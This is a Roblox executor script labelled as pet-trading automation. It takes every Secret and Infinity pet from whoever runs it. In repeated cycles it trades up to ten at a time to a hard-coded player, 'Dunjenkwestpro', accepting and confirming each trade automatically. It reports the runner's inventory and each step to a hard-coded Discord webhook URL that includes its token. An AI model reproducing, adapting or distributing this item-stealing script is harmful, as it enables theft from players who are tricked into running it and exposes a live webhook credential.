local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- Configuration
local TARGET_PLAYER = "Dunjenkwestpro"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1411629941178765365/k0Tw3CWiuZ935oPnQ4GnofN3xcWAc7q3KWg41_SwqtkOlyNotA5nNXzPjf1XVg1zcu4h"
local CYCLE_DELAY = 80 -- 80 seconds between cycles

-- Get required services and modules
local Network = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("RemoteEvent")
local LocalData = require(ReplicatedStorage.Client.Framework.Services.LocalData)
local PetsModule = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Data"):WaitForChild("Pets"))

-- Function to send messages to Discord
local function sendToDiscord(message)
    local payload = HttpService:JSONEncode({content = message})
    local req = (request or http_request or syn and syn.request)
    if req then
        req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = payload
        })
        print("✅ Sent to Discord: " .. message)
    else
        warn("❌ Your executor doesn't support HTTP requests.")
    end
end

-- Function to find Secret/Infinity pets in inventory
local function findTargetPets()
    local targetPets = {}
    for petName, petInfo in pairs(PetsModule) do
        if petInfo.Rarity == "Secret" or petInfo.Rarity == "Infinity" then
            targetPets[petName] = petInfo
        end
    end
    
    local data = LocalData:Get()
    if not data or not data.Pets then
        warn("❌ No pets in inventory.")
        return {}
    end
    
    local foundPets = {}
    for _, pet in pairs(data.Pets) do
        if targetPets[pet.Name] then
            local displayName = ""
            if pet.Shiny then displayName = displayName .. "Shiny " end
            if pet.Mythic then displayName = displayName .. "Mythic " end
            displayName = displayName .. pet.Name
            
            table.insert(foundPets, {
                id = pet.Id,
                name = displayName,
                rarity = targetPets[pet.Name].Rarity
            })
        end
    end
    
    return foundPets
end

-- Function to check if trade is still active
local function isTradeActive()
    -- This would need to be implemented based on your game's specific way of tracking trade status
    -- For now, we'll assume the trade remains active
    return true
end

-- Function to format pet ID with :0 suffix
local function formatPetId(petId)
    local idString = tostring(petId)
    -- Add :0 if it doesn't already have a suffix
    if not idString:match(":") then
        return idString .. ":0"
    end
    return idString
end

-- Function to decline trade and stop everything
local function declineTradeAndStop()
    sendToDiscord("❌ No Secret/Infinity pets left. Declining trade and stopping automation.")
    
    local args = {"TradeDecline"}
    Network:FireServer(unpack(args))
    
    sendToDiscord("🛑 Automation stopped completely. No more pets to trade.")
    
    -- Stop the script completely
    while true do
        wait(3600) -- Just wait forever instead of exiting (some executors don't like exit())
    end
end

-- Main trading function
local function performTrade()
    -- Step 1: Send trade request
    sendToDiscord("🔄 Starting trade cycle with " .. TARGET_PLAYER)
    
    local targetPlayer = Players:WaitForChild(TARGET_PLAYER)
    if not targetPlayer then
        sendToDiscord("❌ Target player not found: " .. TARGET_PLAYER)
        return false
    end
    
    local args = {"TradeRequest", targetPlayer}
    Network:FireServer(unpack(args))
    sendToDiscord("📨 Trade request sent to " .. TARGET_PLAYER)
    
    -- Wait 10 seconds for trade to be accepted
    for i = 1, 10 do
        wait(1)
        if not isTradeActive() then
            sendToDiscord("❌ Trade was cancelled during waiting period")
            return false
        end
    end
    
    -- Step 2: Find target pets
    sendToDiscord("🔍 Scanning for Secret/Infinity pets...")
    local targetPets = findTargetPets()
    
    if #targetPets == 0 then
        -- No pets left, decline trade and stop completely
        declineTradeAndStop()
        return false -- This won't be reached because declineTradeAndStop() stops the script
    end
    
    -- Send list of found pets to Discord
    local petList = "📋 Found " .. #targetPets .. " Secret/Infinity pets:\n"
    for i, pet in ipairs(targetPets) do
        petList = petList .. string.format("%d. %s | ID: %s | Rarity: %s\n", i, pet.name, pet.id, pet.rarity)
    end
    sendToDiscord(petList)
    
    -- Step 3: Add up to 10 pets to trade (but only as many as we have)
    local petsToAdd = math.min(10, #targetPets)
    sendToDiscord("➕ Adding " .. petsToAdd .. " pets to trade...")
    
    for i = 1, petsToAdd do
        if not isTradeActive() then
            sendToDiscord("❌ Trade was cancelled while adding pets")
            return false
        end
        
        local pet = targetPets[i]
        -- Format the pet ID with :0 suffix before sending
        local formattedPetId = formatPetId(pet.id)
        local args = {"TradeAddPet", formattedPetId}
        Network:FireServer(unpack(args))
        sendToDiscord("✅ " .. pet.name .. " added (ID: " .. formattedPetId .. ")")
        wait(1) -- Delay to ensure server processes each pet
    end
    
    -- Step 4: Accept trade after 5 seconds
    wait(5)
    if not isTradeActive() then
        sendToDiscord("❌ Trade was cancelled before acceptance")
        return false
    end
    
    local args = {"TradeAccept"}
    Network:FireServer(unpack(args))
    sendToDiscord("✓ Trade accept")
    
    -- Step 5: Confirm trade after 15 seconds
    wait(15)
    if not isTradeActive() then
        sendToDiscord("❌ Trade was cancelled before confirmation")
        return false
    end
    
    local args = {"TradeConfirm"}
    Network:FireServer(unpack(args))
    sendToDiscord("✓ Trade confirmed")
    
    -- Step 6: Wait 80 seconds before next cycle
    sendToDiscord("🔄 Trading again in " .. CYCLE_DELAY .. " seconds...")
    wait(CYCLE_DELAY)
    return true
end

-- Main loop
sendToDiscord("🤖 Pet trading automation started")
while true do
    local success, err = pcall(performTrade)
    if not success then
        sendToDiscord("❌ Error in trade cycle: " .. tostring(err))
        wait(CYCLE_DELAY) -- Wait before retrying after an error
    end
end